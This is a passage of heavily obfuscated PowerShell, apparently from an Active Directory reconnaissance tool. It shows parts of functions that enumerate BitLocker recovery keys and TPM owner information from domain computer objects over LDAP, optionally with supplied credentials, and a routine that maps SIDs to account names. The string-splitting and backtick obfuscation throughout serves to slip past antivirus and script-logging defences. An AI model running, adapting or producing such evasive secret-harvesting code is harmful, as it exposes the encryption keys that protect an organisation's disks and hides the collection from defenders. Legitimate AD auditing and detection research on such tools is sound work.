                        ${T`EmpC`omP} = &("{2}{3}{4}{1}{0}"-f 'r','pute','Ge','t-','ADCom') -Identity ${o`Bj}.'Distinguished Name' -Properties ("{4}{0}{3}{2}{1}" -f'O','rInformation','ne','w','msTPM-'),("{0}{1}{6}{4}{2}{3}{5}" -f'msTPM-Tp','mInfo','p','u','ationForCom','ter','rm')
                    }
                    Catch
                    {
                        &("{2}{0}{1}{3}"-f 'e-Wa','rnin','Writ','g') "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        &("{2}{1}{0}"-f'ose','-Verb','Write') "[EXCEPTION] $($_.Exception.Message) "
                    }
                    If (${t`eM`p`coMp})
                    {
                        
                        ${O`BJ} | &("{2}{0}{1}" -f 'Memb','er','Add-') -MemberType ("{2}{0}{3}{1}" -f'otePr','perty','N','o') -Name ("{4}{2}{3}{1}{0}" -f'n','o','PM-','OwnerInformati','msT') -Value ${tEMp`cO`mP}.'msTPM-OwnerInformation'

                        
                        ${o`BJ} | &("{2}{0}{1}" -f 'dd-','Member','A') -MemberType ("{2}{0}{1}" -f'otePro','perty','N') -Name ("{2}{0}{6}{3}{5}{1}{4}" -f 'mInfo','pu','msTPM-Tp','o','ter','nForCom','rmati') -Value ${T`e`mpcomP}.'msTPM-TpmInformationForComputer'
                        If (${nu`lL} -ne ${TE`mpComP}.'msTPM-TpmInformationForComputer')
                        {
                            
                            ${TPM`OB`jEcT} = &("{1}{0}{2}" -f 't','Ge','-ADObject') -Identity ${t`e`mpcOMp}.'msTPM-TpmInformationForComputer' -Properties ("{2}{3}{1}{0}"-f'mation','for','msTPM-Ow','nerIn')
                            ${Tp`mRECo`VerYi`N`FO} = ${TPMO`Bje`ct}.'msTPM-OwnerInformation'
                        }
                        Else
                        {
                            ${t`pmREcoVE`R`yin`FO} = ${n`UlL}
                        }
                    }
                    Else
                    {
                        ${O`BJ} | &("{0}{1}{2}" -f'Ad','d','-Member') -MemberType ("{0}{1}{2}" -f 'Note','P','roperty') -Name ("{1}{4}{2}{0}{3}{5}" -f'n','msTPM-O','rI','fo','wne','rmation') -Value ${n`ULl}
                        ${o`Bj} | &("{0}{2}{1}"-f 'A','d-Member','d') -MemberType ("{0}{2}{1}"-f'NoteP','rty','rope') -Name ("{8}{4}{2}{6}{0}{5}{9}{7}{1}{3}"-f 'fo','e','pmI','r','M-T','rmationFor','n','ut','msTP','Comp') -Value ${n`ULL}
                        ${T`Pm`RECoveR`yInfO} = ${n`ULL}

                    }
                    ${o`BJ} | &("{0}{1}{2}"-f 'Add','-Me','mber') -MemberType ("{2}{0}{1}{3}"-f'oteP','ro','N','perty') -Name ("{0}{3}{1}{2}" -f'TPM ','s','sword','Owner Pa') -Value ${tpm`ReCove`RyiN`FO}
                    ${BI`TLOc`KeroBj} += ${O`Bj}
                }
            }
            &("{0}{2}{1}" -f 'Remo','ble','ve-Varia') ("{5}{2}{3}{0}{4}{7}{6}{1}"-f 'c','Keys','t','LockerRe','ove','ADBi','y','r')
        }
    }

    If (${mE`Th`OD} -eq ("{0}{1}" -f'LD','AP'))
    {
        ${ObJs`earCH`er} = &("{3}{1}{2}{0}"-f 'ct','w','-Obje','Ne') ("{2}{3}{5}{4}{6}{1}{0}" -f'r','rySearche','System.Di','rectory','ervic','S','es.Directo') ${oB`jDo`Ma`IN}
        ${oB`J`SeaRCh`er}."Pa`GES`IZe" = ${pA`GES`IZE}
        ${ob`JSEa`RCHER}."fil`T`er" = ("{1}{9}{3}{10}{0}{11}{6}{7}{4}{8}{2}{5}" -f '-','(ob','io','lass=msF','or','n)','coveryIn','f','mat','jectC','VE','Re')
        ${objseaR`c`HeR}."PRoP`eR`Ti`E`s`ToLOAd".("{1}{2}{0}" -f 'dRange','A','d').Invoke((("{2}{1}{0}{3}" -f 'tinguish','s','di','edName'),("{5}{6}{1}{0}{3}{2}{4}"-f '-','fve','pass','recovery','word','m','s'),("{0}{2}{1}{3}"-f 'msfve','erygui','-recov','d'),("{0}{4}{2}{3}{1}"-f'msf','guid','vo','lume','ve-'),("{4}{2}{3}{1}{5}{0}"-f'n','nformati','tpm-owner','i','ms','o'),("{5}{0}{4}{3}{2}{1}" -f 'in','r','orcompute','f','formation','mstpm-tpm'),("{1}{0}" -f'me','na'),("{3}{0}{2}{1}" -f'e','ed','at','whencr')))
        ${O`Bjse`ArcHER}."s`EArc`Hsc`Ope" = ("{2}{0}{1}" -f'e','e','Subtr')

        Try
        {
            ${aDBi`Tlo`C`KErRECoV`ERY`k`EYS} = ${O`BJSeAR`ch`eR}.("{0}{1}"-f 'FindAl','l').Invoke()
        }
        Catch
        {
            &("{2}{4}{3}{0}{1}"-f 'Warn','ing','W','e-','rit') ("{4}{13}{5}{11}{2}{15}{10}{8}{16}{12}{9}{6}{0}{3}{7}{1}{14}{17}" -f 'f','on','e en','orm','[Get-ADRBitLo',' ','ryIn','ati','ating ','e','r','whil','Recov','cker] Error',' Ob','ume','msFVE-','jects')
            &("{1}{0}{3}{2}"-f 'r','W','Verbose','ite-') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`UlL}
        }
        ${oBjse`ARC`HeR}.("{1}{0}" -f 'ispose','d').Invoke()

        If (${A`D`BitLo`CKeRR`ec`ovERY`keyS})
        {
            ${c`Nt} = $( (gEt-iTeM  VARiaBle:D761p ).VALue::("{2}{0}{1}" -f 'ctC','ount','Obje').Invoke(${adB`IT`Lo`ckerR`ecovEryKe`Ys}))
            If (${c`NT} -ge 1)
            {
                &("{3}{0}{4}{1}{2}"-f 'te-','b','ose','Wri','Ver') ('[*'+'] '+'T'+'ot'+'al '+'B'+'it'+'Loc'+'ker '+'R'+'ecove'+'ry '+'K'+'ey'+'s: '+"$cnt")
                ${biTloCk`E`ROBj} = @()
                ${a`db`i`T`LO`ckeRreCoV`E`RYkEYs} | &("{2}{3}{1}{0}" -f 'ct','-Obje','For','Each') {
                    
                    ${o`BJ} = &("{1}{0}{2}"-f '-Ob','New','ject') ("{0}{2}{1}"-f'PS','ect','Obj')
                    ${o`Bj} | &("{0}{2}{1}"-f'Ad','ber','d-Mem') -MemberType ("{1}{0}{3}{2}" -f'pe','NotePro','y','rt') -Name ("{0}{3}{1}{2}" -f'Disting','ishe','d Name','u') -Value $(((${_}."PrOPe`Rti`es"."Di`s`TINgUIsHed`Name" -split '}')[1]).("{1}{0}"-f'bstring','su').Invoke(1))
                    ${O`BJ} | &("{0}{2}{1}"-f 'Ad','ber','d-Mem') -MemberType ("{0}{2}{3}{1}"-f'N','Property','ot','e') -Name ("{0}{1}" -f'N','ame') -Value ([string] (${_}."prO`pErt`ieS"."N`AMe"))
                    ${o`BJ} | &("{3}{2}{1}{0}"-f'er','emb','d-M','Ad') -MemberType ("{2}{0}{3}{1}"-f'oteProper','y','N','t') -Name ("{1}{2}{0}"-f'ted','whe','nCrea') -Value ([DateTime] $(${_}."pRo`PE`RTIEs"."whEn`c`R`EaTED"))
                    ${o`BJ} | &("{3}{0}{1}{2}" -f 'M','emb','er','Add-') -MemberType ("{1}{3}{0}{2}" -f 'e','NotePro','rty','p') -Name ("{1}{0}{2}{3}"-f' ','Recovery','K','ey ID') -Value $([GUID] ${_}."Pr`OPErtI`ES".'msfve-recoveryguid'[0])
                    ${O`BJ} | &("{0}{1}{2}"-f 'Add','-Me','mber') -MemberType ("{2}{1}{0}"-f'perty','Pro','Note') -Name ("{1}{0}{2}"-f'ecov','R','ery Key') -Value ([string] (${_}."PR`OpeRT`IeS".'msfve-recoverypassword'))
                    ${O`BJ} | &("{2}{0}{1}"-f'Me','mber','Add-') -MemberType ("{1}{2}{0}"-f 'y','NoteProp','ert') -Name ("{0}{2}{1}" -f'V','e GUID','olum') -Value $([GUID] ${_}."pR`Op`ErTieS".'msfve-volumeguid'[0])

                    ${Ob`j`seaR`cher} = &("{0}{2}{3}{1}" -f'New-','ct','Ob','je') ("{3}{4}{0}{7}{5}{6}{2}{8}{1}" -f 'tem.DirectorySer','her','ySea','S','ys','ces.','Director','vi','rc') ${objDO`m`A`in}
                    ${oBj`seaRCH`Er}."PA`ge`SIZE" = ${pa`GesIze}
                    ${O`Bj`seaRcHER}."F`IlteR" = "(&(samAccountType=805306369)(distinguishedName=$($Obj.'Distinguished Name'))) "
                    ${o`BJSEaRc`H`Er}."p`Ro`pErtI`e`stoLOaD".("{1}{0}{2}"-f'ddRa','A','nge').Invoke((("{4}{0}{3}{2}{1}" -f'rinf','ation','m','or','mstpm-owne'),("{1}{7}{0}{5}{4}{2}{6}{3}"-f'rmat','m','om','er','c','ionfor','put','stpm-tpminfo')))
                    ${ObJse`ARC`HER}."sEA`RcHScO`Pe" = ("{2}{0}{1}" -f 'ub','tree','S')

                    Try
                    {
                        ${T`EMpcOMp} = ${ObJ`S`eA`RCHER}.("{0}{1}" -f 'Find','All').Invoke()
                    }
                    Catch
                    {
                        &("{3}{2}{1}{0}" -f'ng','ni','e-War','Writ') "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        &("{3}{0}{2}{1}" -f 'e-Ve','se','rbo','Writ') "[EXCEPTION] $($_.Exception.Message) "
                    }
                    ${O`BjSEa`Rc`HER}.("{2}{1}{0}" -f'spose','i','d').Invoke()

                    If (${T`eMp`cOMP})
                    {
                        
                        ${o`Bj} | &("{1}{2}{0}" -f'-Member','Ad','d') -MemberType ("{0}{3}{1}{2}" -f 'Note','ropert','y','P') -Name ("{3}{2}{0}{4}{1}" -f'OwnerInf','n','PM-','msT','ormatio') -Value $([string] ${TEM`P`comP}."pR`oPERT`iEs".'mstpm-ownerinformation')

                        
                        ${O`BJ} | &("{2}{1}{0}" -f'ember','d-M','Ad') -MemberType ("{0}{1}{2}"-f'N','ot','eProperty') -Name ("{3}{0}{1}{4}{5}{7}{6}{2}" -f'P','M-Tpm','Computer','msT','Inf','or','nFor','matio') -Value $([string] ${t`emP`CoMp}."ProPe`RTI`Es".'mstpm-tpminformationforcomputer')
                        If (${nu`Ll} -ne ${tempCO`mp}."P`R`o`PerTiEs".'mstpm-tpminformationforcomputer')
                        {
                            
                            If (${CR`E`dEnTial} -ne  ( lS vaRIAbLE:Nk5p).vaLuE::"E`mptY")
                            {
                                ${oB`JseaRCH`paTH} = &("{1}{2}{0}"-f't','New-Ob','jec') ("{1}{8}{0}{3}{2}{5}{4}{9}{6}{7}" -f'ctor','System.','s.Di','yService','e','r','ryE','ntry','Dire','cto') "LDAP://$($DomainController)/$($TempComp.Properties.'mstpm-tpminformationforcomputer')", ${c`REDe`NTIaL}."USER`NamE",${C`REDeN`Tial}.("{1}{2}{0}{5}{4}{3}" -f 't','GetN','e','edential','kCr','wor').Invoke()."PASsW`o`RD"
                                ${oBjs`E`A`RcHER`paTH} = &("{2}{1}{0}"-f 'ect','Obj','New-') ("{3}{8}{6}{5}{7}{0}{2}{4}{1}"-f 'rvi','er','ces.Director','S','ySearch','or','Direct','ySe','ystem.') ${O`Bjs`eAr`ChpATH}
                                ${Obj`S`EArC`hErpAtH}."p`RopEr`TI`ESt`oLoad".("{2}{0}{1}"-f 'ang','e','AddR').Invoke((("{3}{2}{1}{0}{4}" -f 'r','info','r','mstpm-owne','mation')))
                                Try
                                {
                                    ${T`pMO`B`JecT} = ${OBjs`eaR`CHER`pAth}.("{1}{0}" -f 'indAll','F').Invoke()
                                }
                                Catch
                                {
                                    &("{1}{2}{0}" -f'e','Write-V','erbos') "[EXCEPTION] $($_.Exception.Message) "
                                }
                                ${OBJseARc`her`p`ATh}.("{0}{1}"-f'di','spose').Invoke()

                                If (${tPM`oBj`ecT})
                                {
                                    ${tPM`RecOVery`I`NFO} = $([string] ${TpM`objE`CT}."PR`o`PErtiES".'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    ${tp`Mr`e`CO`VEry`inFo} = ${N`Ull}
                                }
                            }
                            Else
                            {
                                Try
                                {
                                    ${t`pMOBJE`Ct} = ([ADSI]"LDAP://$($TempComp.Properties.'mstpm-tpminformationforcomputer')")
                                }
                                Catch
                                {
                                    &("{3}{2}{0}{4}{1}" -f'e-Verb','se','it','Wr','o') "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If (${TPMOb`j`eCt})
                                {
                                    ${T`pmreC`OVeRy`iN`Fo} = $([string] ${TP`Mo`BJecT}."prO`PeR`T`Ies".'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    ${T`PmR`eCOVe`Ryi`NFo} = ${Nu`LL}
                                }
                            }
                        }
                    }
                    Else
                    {
                        ${O`Bj} | &("{1}{0}{2}" -f 'Membe','Add-','r') -MemberType ("{2}{1}{3}{0}"-f'erty','ot','N','eProp') -Name ("{3}{1}{0}{2}" -f 'ormati','f','on','msTPM-OwnerIn') -Value ${nU`LL}
                        ${o`BJ} | &("{2}{0}{1}"-f'Memb','er','Add-') -MemberType ("{0}{1}{2}" -f'NoteP','rop','erty') -Name ("{6}{2}{4}{0}{3}{5}{7}{1}" -f'fo','ter','sTPM','rmati','-TpmIn','onFor','m','Compu') -Value ${N`ULL}
                        ${t`pmRe`C`OVEryiNFO} = ${Nu`lL}
                    }
                    ${O`BJ} | &("{1}{0}{2}"-f'd','A','d-Member') -MemberType ("{3}{0}{1}{2}" -f 'Prope','rt','y','Note') -Name ("{3}{0}{1}{4}{2}"-f'PM Owne','r Passw','d','T','or') -Value ${tP`mR`e`CoverY`InFo}
                    ${BiT`LOCK`eroBj} += ${o`Bj}
                }
            }
            &("{2}{0}{4}{1}{3}" -f '-','a','Remove','riable','V') ("{0}{1}" -f 'cn','t')
            &("{1}{0}{2}"-f'emove-Var','R','iable') ("{4}{0}{6}{5}{2}{3}{1}"-f 'itLockerR','ys','veryK','e','ADB','o','ec')
        }
    }

    If (${BiTLO`CK`eRObJ})
    {
        Return ${b`ItlOCK`e`Ro`BJ}
    }
    Else
    {
        Return ${nu`ll}
    }
}


Function co`Nv`E`R`TFROm-SID
{

    Param(
        [Parameter(MAndaTOry = ${t`Rue})]
        [string] ${ME`THOd},

        [Parameter(mAndatORy = ${tR`Ue})]
        [Alias('SID')]
        
        [String]
        ${ObJ`E`Ct`sid},

        [Parameter(manDatoRy = ${f`Alse})]
        [string] ${DoMA`Inf`qdN},

        [Parameter(MaNDatOrY = ${f`AlSe})]
        [Management.Automation.PSCredential] ${C`RedE`NtIal} =  $nk5P::"E`mptY",

        [Parameter(maNDaTORy = ${Fa`LsE})]
        [bool] ${re`solv`E`sID} = ${FAl`sE}
    )

    BEGIN {
        
        
        ${ads_NAmE_`iniTt`Y`P`E_Dom`A`In}   = 1 
        
        ${a`dS_N`Ame_`INit`Type`_gc}       = 3 

        
        
        
        
        ${aD`S`_na`ME_`TypE_`NT4}                      = 3 
        
        
        
        
        ${ADS_nA`ME_TY`pE_`U`NKnO`Wn}                  = 8 
        
        
        
        

        
        
        
        
        ${AD`S`_Ch`ASe_refER`Ra`ls_a`l`waYS}      = (0x60) 
    }

    PROCESS {
        ${t`AR`gETs`Id} = $(${obj`EC`TS`iD}.("{2}{1}{3}{0}"-f 'art','ri','T','mSt').Invoke("O:"))
        ${t`A`RGEtsID} = $(${T`A`R`GEtSid}.("{1}{0}" -f 'm','Tri').Invoke('*'))
        If (${tar`G`EtSID} -match ("{1}{0}{2}"-f '-1-','^S','.*'))
        {
            Try
            {
                
                Switch (${TARg`et`Sid}) {
                    ("{0}{1}"-f'S-1-','0')         { ("{0}{2}{3}{1}"-f 'N','rity','ull',' Autho') }
                    ("{1}{0}" -f'1-0-0','S-')       { ("{0}{1}"-f 'No','body') }
                    ("{1}{0}"-f'1','S-1-')         { ("{0}{2}{3}{1}"-f'Wo','uthority','rld ','A') }
                    ("{1}{0}" -f '0','S-1-1-')       { ("{1}{2}{0}" -f 'one','E','very') }
                    ("{1}{0}" -f'-2','S-1')         { ("{1}{3}{2}{0}{4}" -f 'hor','Local','ut',' A','ity') }
                    ("{0}{1}" -f'S-1','-2-0')       { ("{0}{1}"-f 'L','ocal') }
                    ("{0}{1}"-f'S-1-','2-1')       { ("{3}{0}{1}{2}"-f'o','gon',' ','Console L') }
                    ("{1}{0}" -f'-1-3','S')         { ("{4}{0}{2}{1}{3}" -f'e','r Autho','ato','rity','Cr') }
                    ("{0}{1}" -f 'S-1','-3-0')       { ("{2}{0}{1}{3}" -f'reator ','O','C','wner') }
                    ("{0}{1}" -f'S','-1-3-1')       { ("{0}{2}{3}{1}" -f'C','p','reator G','rou') }
                    ("{1}{0}" -f '-1-3-2','S')       { ("{3}{4}{1}{2}{5}{0}" -f' Server','w','ne','Creat','or O','r') }
                    ("{2}{0}{1}"-f'-1-','3-3','S')       { ("{0}{4}{3}{1}{2}" -f'C',' ','Server','ator Group','re') }
                    ("{0}{1}" -f 'S-1-3-','4')       { ("{3}{1}{0}{2}"-f ' Right','ner','s','Ow') }
                    ("{1}{0}"-f'4','S-1-')         { ("{4}{1}{3}{0}{5}{2}"-f'hor','Au','ty','t','Non-unique ','i') }
                    ("{0}{1}" -f'S-','1-5')         { ("{1}{3}{0}{2}"-f' ','N','Authority','T') }
                    ("{1}{0}"-f '5-1','S-1-')       { ("{2}{0}{1}" -f'i','alup','D') }
                    ("{0}{1}"-f'S-1-','5-2')       { ("{0}{1}" -f'N','etwork') }
                    ("{2}{1}{0}" -f'-3','-1-5','S')       { ("{0}{1}"-f 'Batc','h') }
                    ("{0}{1}" -f'S-1-5-','4')       { ("{2}{1}{3}{0}"-f 'ive','a','Inter','ct') }
                    ("{1}{0}"-f'-1-5-6','S')       { ("{1}{2}{0}" -f'rvice','S','e') }
                    ("{0}{2}{1}" -f'S-1','7','-5-')       { ("{0}{2}{1}"-f 'Anony','s','mou') }
                    ("{0}{1}" -f'S-1-5-','8')       { ("{1}{0}"-f'roxy','P') }
                    ("{0}{1}"-f'S-1-5','-9')       { ("{3}{6}{7}{1}{2}{4}{0}{8}{5}" -f't','se ','D','E','omain Con','llers','nte','rpri','ro') }
                    ("{1}{0}{2}" -f '-1-5','S','-10')      { ("{0}{1}{3}{2}{4}" -f'Pri','nci','S','pal ','elf') }
                    ("{0}{2}{1}"-f'S-','1','1-5-1')      { ("{2}{0}{4}{3}{5}{1}" -f 'uth','Users','A','ica','ent','ted ') }
                    ("{0}{2}{1}" -f'S-1-','2','5-1')      { ("{1}{2}{0}{4}{3}"-f'r','Res','t','d Code','icte') }
                    ("{2}{0}{1}" -f'-1-5','-13','S')      { ("{1}{3}{0}{2}{4}"-f 'al Ser','Ter','ver U','min','sers') }
                    ("{1}{0}{2}" -f'-1-5','S','-14')      { ("{4}{1}{0}{3}{2}" -f'ct','era','on','ive Log','Remote Int') }
                    ("{0}{1}"-f 'S','-1-5-15')      { ("{3}{2}{0}{1}"-f'atio','n ','his Organiz','T') }
                    ("{0}{2}{1}" -f'S-1-','7','5-1')      { ("{1}{0}{2}{5}{4}{3}" -f' Or','This','ga','n ','tio','niza') }
                    ("{2}{1}{0}"-f'-18','-5','S-1')      { ("{2}{0}{1}{3}" -f'S','y','Local ','stem') }
                    ("{1}{0}" -f '19','S-1-5-')      { ("{1}{3}{0}{2}"-f ' Au','N','thority','T') }
                    ("{1}{0}" -f '-20','S-1-5')      { ("{1}{2}{3}{0}"-f 'y','NT Autho','r','it') }
                    ("{1}{0}{2}" -f '-','S','1-5-80-0')    { ("{2}{0}{4}{1}{3}"-f'l Se','e','Al','s ','rvic') }
                    ("{2}{3}{1}{0}"-f'2-544','3','S-1-','5-')  { ((("{4}{0}{3}{2}{1}{5}" -f 'UILT','LxqAdministrat','N','I','B','ors')).("{1}{0}"-f'lacE','Rep').Invoke('Lxq','\')) }
                    ("{0}{2}{1}{3}"-f'S-1-5-3','5','2-','45')  { ((("{2}{0}{1}" -f 'UILTINPxIU','sers','B'))-CREPLaCE ([CHar]80+[CHar]120+[CHar]73),[CHar]92) }
                    ("{2}{1}{0}"-f '2-546','-5-3','S-1')  { ((("{0}{2}{1}"-f'BUILTINzypGues','s','t'))  -cRePLace 'zyp',[Char]92) }
                    ("{1}{0}{2}" -f '-5-','S-1','32-547')  { ((("{3}{0}{1}{4}{2}" -f 'uYaP','ower ','rs','BUILTIN','Use'))."re`PlAce"(([chAr]117+[chAr]89+[chAr]97),[STRInG][chAr]92)) }
                    ("{1}{3}{2}{0}" -f '548','S-1-5','32-','-')  { ((("{2}{0}{4}{6}{1}{7}{5}{3}" -f 'eWAcc','t','BUILTINf','ators','ou','r','n',' Ope')) -crePlacE ([ChAR]102+[ChAR]101+[ChAR]87),[ChAR]92) }
                    ("{3}{0}{2}{1}"-f '1-','49','5-32-5','S-')  { ((("{4}{6}{0}{7}{8}{3}{1}{5}{2}"-f'LTI','Server Oper','tors','o','BU','a','I','N','7N'))  -rEPLACE'7No',[cHAr]92) }
                    ("{2}{3}{0}{1}"-f'-55','0','S','-1-5-32')  { ((("{5}{6}{4}{3}{0}{2}{1}" -f 'Op','tors','era','nt ','sPri','B','UILTINCg'))."r`EpLaCE"(([cHAR]67+[cHAR]103+[cHAR]115),[STRinG][cHAR]92)) }
                    ("{2}{1}{0}"-f'51','5-32-5','S-1-')  { ((("{0}{1}{3}{2}{4}"-f 'BUIL','TI','Backup Op','NMNr','erators'))."rep`l`Ace"('MNr',[STrINg][CHar]92)) }
                    ("{1}{2}{0}" -f '-552','S-1-5-','32')  { ((("{2}{5}{3}{0}{1}{4}"-f 'cat','o','BUILTIN{0}','i','rs','Repl')) -f  [char]92) }
                    ("{0}{1}{2}{3}" -f 'S-1','-5-32-','55','4')  { ((("{4}{1}{5}{7}{6}{2}{0}{3}"-f'a','ILTIN','ws 2000 Comp','tible Access','BU','{0}Pr','indo','e-W'))-f[ChAr]92) }
                    ("{1}{0}{2}"-f '32-','S-1-5-','555')  { ((("{1}{4}{2}{0}{5}{3}"-f 'ktop Us','BUILTIN{0}Re','Des','s','mote ','er'))-F [cHaR]92) }
                    ("{2}{1}{0}{3}"-f'2-5','1-5-3','S-','56')  { ((("{6}{2}{5}{1}{4}{0}{3}" -f'ion Ope','work C','sAO','rators','onfigurat','Net','BUILTIN'))  -cREpLaCe ([chaR]115+[chaR]65+[chaR]79),[chaR]92) }
                    ("{1}{0}{2}" -f '5-32-5','S-1-','57')  { ((("{4}{10}{1}{9}{5}{7}{8}{6}{2}{3}{0}"-f 'rs','jI','i','lde','BUILTINL','n','st Bu','g Fore','st Tru','ncomi','q'))-REplACe  ([chAr]76+[chAr]113+[chAr]106),[chAr]92) }
                    ("{2}{0}{3}{1}" -f '-1-','32-558','S','5-')  { ((("{3}{1}{7}{5}{9}{8}{6}{2}{4}{0}" -f's','ILT',' M','BU','onitor User','fo','e','INGe4Per','c','rman'))-CrEpLACE 'Ge4',[chaR]92) }
                    ("{1}{0}{2}" -f '1-5-32-55','S-','9')  { ((("{7}{6}{2}{0}{4}{3}{9}{8}{5}{1}"-f 'INjbC','g Users','T','e','P','ance Lo','UIL','B','rm','rfo')) -CreplacE ([ChAR]106+[ChAR]98+[ChAR]67),[ChAR]92) }
                    ("{2}{0}{3}{1}" -f'1-5-3','0','S-','2-56')  { ((("{2}{10}{6}{5}{7}{4}{3}{0}{9}{1}{8}"-f'zation A','s Grou','B','uthori',' A','QWind','IN60','ows','p','cces','UILT'))  -ReplAce  '60Q',[ChAr]92) }
                    ("{0}{3}{1}{2}"-f'S-1-5','32-','561','-')  { ((("{9}{2}{7}{1}{5}{8}{4}{0}{6}{3}"-f'Serv','nal Server Lic','rm','rs','e ','en','e','i','s','BUILTIN{0}Te'))-F  [chAr]92) }
                    ("{2}{1}{0}{3}" -f'-56','1-5-32','S-','2')  { ((("{2}{0}{4}{5}{3}{1}" -f'NerWDistr','sers','BUILTI',' U','ib','uted COM')) -crEPLACe'erW',[cHAR]92) }
                    ("{2}{1}{3}{0}"-f '32-569','-1-5','S','-')  { ((("{2}{5}{1}{4}{6}{0}{3}"-f ' Oper','CICryptograp','BUILTIN','ators','h','3','ic'))."r`E`plAce"('3CI',[STrING][CHar]92)) }
                    ("{2}{1}{3}{0}" -f '5-32-573','-','S','1-')  { ((("{0}{5}{3}{4}{2}{1}"-f'B','rs','nt Log Reade','TINRBQE','ve','UIL')) -CRepLACE'RBQ',[chAr]92) }
                    ("{3}{2}{0}{1}"-f '32','-574','-5-','S-1')  { ((("{0}{8}{2}{6}{5}{7}{9}{4}{1}{3}"-f 'B','e DCOM A','L','ccess','c','fic','TIN0slCerti','ate Se','UI','rvi'))-CreplAcE  ([cHar]48+[cHar]115+[cHar]108),[cHar]92) }
                    ("{1}{0}{2}" -f'-3','S-1-5','2-575')  { ((("{5}{0}{3}{6}{2}{7}{1}{4}"-f 'INn1','rv',' A','8RD','ers','BUILT','S Remote','ccess Se')).("{2}{1}{0}" -f 'E','ePlAC','r').Invoke('n18','\')) }
                    ("{2}{0}{1}" -f '-5-32-57','6','S-1')  { ((("{7}{1}{5}{8}{3}{0}{6}{2}{4}" -f ' End','IL','int Se','S','rvers','T','po','BU','IN18lRD'))."re`PLACe"(([cHaR]49+[cHaR]56+[cHaR]108),'\')) }
                    ("{0}{3}{2}{1}"-f 'S-1','77','2-5','-5-3')  { ((("{7}{3}{2}{1}{6}{0}{5}{4}" -f't','S Mana','{0}RD','ILTIN','rvers',' Se','gemen','BU'))  -F [ChAR]92) }
                    ("{0}{2}{3}{1}" -f'S-','578','1-5-32','-')  { ((("{0}{8}{3}{1}{7}{5}{4}{6}{2}"-f'BUI','}Hy','rs','IN{0','inis','V Adm','trato','per-','LT'))  -f[CHAr]92) }
                    ("{0}{1}{2}{3}" -f 'S-1-','5-3','2-57','9')  { ((("{1}{2}{12}{11}{3}{5}{6}{7}{0}{9}{10}{8}{4}"-f't','BUI','LT','}Access','ators',' ','Co','n','er','rol Assistanc','e Op','0','IN{'))  -f [ChAr]92) }
                    ("{0}{1}{3}{2}"-f 'S-','1-5-32-5','0','8')  { ((("{0}{8}{4}{6}{3}{1}{2}{5}{7}" -f 'B','anag','em','mote M','N{0}','e','Re','nt Users','UILTI'))  -F [char]92) }
                    Default {
                        
                        If ( (${TAr`g`etsid} -match ("{1}{0}"-f 'S-1-.*','^')) -and (${reso`L`VEsId}) )
                        {
                            If (${M`EthoD} -eq ("{1}{0}" -f'WS','AD'))
                            {
                                Try
                                {
                                    ${aDOb`J`EcT} = &("{2}{1}{3}{0}"-f'ct','ADObj','Get-','e') -Filter ('ob'+'jec'+'tSid '+'-'+'eq '+"'$TargetSid'") -Properties ("{3}{4}{0}{1}{2}{5}" -f'hedN','a','m','Dis','tinguis','e'),("{1}{0}{2}" -f 'MAcco','sA','untName')
                                }
                                Catch
                                {
                                    &("{0}{2}{3}{1}"-f'Wr','arning','ite-','W') ("{8}{2}{6}{1}{9}{0}{4}{3}{10}{5}{11}{7}"-f'Error while enumer','rom','e','in','at','ect','rtF','ID','[Conv','-SID] ','g Obj',' using S')
                                    &("{3}{4}{0}{2}{1}" -f 'rb','se','o','Writ','e-Ve') "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If (${adO`B`jEcT})
                                {
                                    ${uS`eRDo`MAiN} = &("{2}{1}{0}"-f'FQDN','et-DNto','G') -ADObjectDN ${AD`o`BjECT}."DIstingUi`sH`ED`N`Ame"
                                    ${AdsOu`T`PUt} = ${use`RDoM`AIN} + "\" + ${Adobj`e`ct}."saMACc`OuNtNA`ME"
                                    &("{2}{1}{0}"-f'-Variable','e','Remov') ("{0}{3}{2}{1}" -f 'Use','n','Domai','r')
                                }
                            }

                            If (${m`Ethod} -eq ("{0}{1}"-f 'LD','AP'))
                            {
                                If (${cr`ed`EntiAL} -ne  (  GEt-iTEm  ('VArIabl'+'E:N'+'K'+'5P')  ).value::"emP`Ty")
                                {
                                    ${Ad`oB`jEct} = &("{3}{1}{2}{0}"-f 't','-O','bjec','New') ("{7}{4}{2}{1}{8}{0}{5}{3}{6}"-f 'irect','s.','Service','yEn','ystem.Directory','or','try','S','D')("LDAP://$DomainFQDN/<SID=$TargetSid>",(${C`REdeNt`Ial}.("{3}{2}{0}{1}{4}"-f 'den','ti','tNetworkCre','Ge','al').Invoke())."UsE`RN`AME",(${cR`Edenti`Al}.("{1}{3}{2}{6}{4}{5}{0}" -f 'l','Get','w','Net','e','dentia','orkCr').Invoke())."PaSs`Wo`RD")
                                }
                                Else
                                {
                                    ${AdOb`JECt} = &("{1}{2}{0}"-f'Object','Ne','w-') ("{6}{8}{0}{2}{7}{11}{4}{5}{3}{10}{1}{9}"-f 'Direct','oryEntr','o','c','D','ire','Sy','rySe','stem.','y','t','rvices.')("LDAP://$DomainFQDN/<SID=$TargetSid>")
                                }
                                If (${Ad`OB`JEct})
                                {
                                    If (-Not (  (  geT-CHILDitEM ("v"+"ArIAB"+"lE"+":H"+"WN23") ).vaLue::("{2}{3}{0}{1}" -f'Empt','y','I','sNullOr').Invoke(${Ad`OBJe`Ct}."PrO`pER`T`ieS"."SAm`AC`CouNtNAme")) )
                                    {
                                        ${UsErD`OM`A`IN} = &("{0}{1}{2}{3}"-f'Get-D','NtoF','QD','N') -ADObjectDN $([string] (${AD`obJe`CT}."p`RopErT`IES"."D`IST`INGuIS`hedn`A`mE"))
                                        ${aDsou`T`pUT} = ${u`S`ERDOMaIn} + "\" + $([string] (${a`DO`BjEct}."PRop`er`TIES"."samaC`c`O`Untna`mE"))
                                        &("{3}{0}{1}{2}{4}" -f 've-','Vari','abl','Remo','e') ("{2}{3}{1}{0}" -f 'n','omai','Us','erD')
                                    }
                                }
                            }

                            If ( (-Not ${Ad`soutp`UT}) -or (  (vAriABlE ('h'+'Wn23')  -ValueO  )::("{1}{2}{0}"-f 'Empty','IsN','ullOr').Invoke(${aDsoU`TP`Ut})) )
                            {
                                ${a`Ds`oUtPUTTYpE} = ${AdS_n`AME_`TY`pe_NT4}
